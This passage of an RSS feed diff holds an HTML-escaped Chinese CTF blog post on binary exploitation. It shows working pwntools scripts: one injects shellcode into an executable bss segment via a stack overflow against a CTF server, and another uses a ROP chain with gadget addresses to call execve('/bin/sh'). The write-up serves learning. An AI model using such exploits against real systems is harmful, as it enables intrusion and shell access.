punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;ret2shellcode&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ret2shellcode&#34;&gt;#&lt;/a&gt; ret2shellcode&lt;/h2&gt;
+&lt;p&gt;ret2shellcode，即控制程序执行 shellcode 代码。&lt;/p&gt;
+&lt;h3 id=&#34;pwn2_2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pwn2_2&#34;&gt;#&lt;/a&gt; pwn2_2&lt;/h3&gt;
+&lt;p&gt;checksec 查看保护&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221220132950.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;典中典之 NX&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221220140613.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221220140735.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;无现成后门可用&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;mprotect((&amp;amp;phone_number &amp;amp; 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;发现 mprotect 函数修改了 phone_number bss 段的权限&lt;/p&gt;
+&lt;p&gt;第三个参数为 7 表示&lt;strong&gt;可读可写可执行&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;即思路是将 shellcode 写入 phone_number bss 段 再通过栈溢出来执行&lt;/p&gt;
+&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;context&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;arch &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;amd64&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; os &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;linux&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;log_level&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;debug&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;io&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;remote&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;gxh191.top&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;25542&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;shellcode&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;asm&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;shellcraft&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sh&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;payload&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;b&#39;a&#39;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;16&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4040A0&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x18&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt;p64&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0x4040A0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ber:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;shellcode&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sendlineafter&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;uf:&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;io&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;interactive&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;ret2syscall&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ret2syscall&#34;&gt;#&lt;/a&gt; ret2syscall&lt;/h2&gt;
+&lt;h3 id=&#34;原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
+&lt;p&gt;ret2syscall，即控制程序执行系统调用，获取 shell。&lt;/p&gt;
+&lt;p&gt;pop eax 将栈顶数据弹到 eax 里面&lt;/p&gt;
+&lt;h4 id=&#34;以ctfwiki上的例子做一下&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#以ctfwiki上的例子做一下&#34;&gt;#&lt;/a&gt; 以 ctfwiki 上的例子做一下&lt;/h4&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221227152927.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;NX 保护&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221227152726.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;gets 栈溢出先用 cyclic 获取偏移量&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221227153509.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;得偏移量 112&lt;/p&gt;
+&lt;p&gt;应用程序调用系统调用的过程是：&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;把系统调用的编号存入 EAX；
+把函数参数存入其它通用寄存器；
+触发 0x80 号中断（int 0x80）。
+[sys_execve系统调用号是11也就是0xb]
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Syscall 的函数调用规范为&lt;/strong&gt;： &lt;code&gt;execve(“/bin/sh”, 0,0)&lt;/code&gt; ;&lt;/p&gt;
+&lt;p&gt;所以，&lt;strong&gt;eax&lt;/strong&gt; = 0xb | &lt;strong&gt;ebx&lt;/strong&gt; = address of ‘/bin/sh’ | &lt;strong&gt;ecx&lt;/strong&gt; = 0 | &lt;strong&gt;edx&lt;/strong&gt; = 0&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221227153810.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;payload=b’a’*112+p32(pop_rax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr)&lt;/p&gt;
+&lt;p&gt;用 ROPgadget 获取一些命令片段的地址&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221227154902.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;先找 eax&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;0x080bb196 : pop eax ; ret&lt;/code&gt;  这个可以用&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221227155404.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;可以用 3 个寄存器都有了&lt;/p&gt;
+&lt;p&gt;再找’/bin/sh’字符串和 int 0x80&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221227155727.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221227155827.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;都找到了 可以写 exp 了&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;from pwn import * p=process(&#39; ./rop&#39;) int_addr=0x8049421 bin_addr=0x80be408 pop_other_ret=0x806eb90 pop_eax_ret=0x80bb196 payload=b&#39;a&#39;*112+p32(pop_eax_ret)+p32(0xb)+p32(pop_other_ret)+p32(0)+p32(0)+p32(bin_addr)+p32(int_addr) p.sendline(payload) p.interactive()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;运行一下 成功本地 get shell&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221227161008.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/QQ%E5%9B%BE%E7%89%8720221211175742.gif&#34; alt=&#34;image.gif&#34;&gt;&lt;/p&gt;
+ ]]></description>
+        </item>
+    </channel>
+</rss>
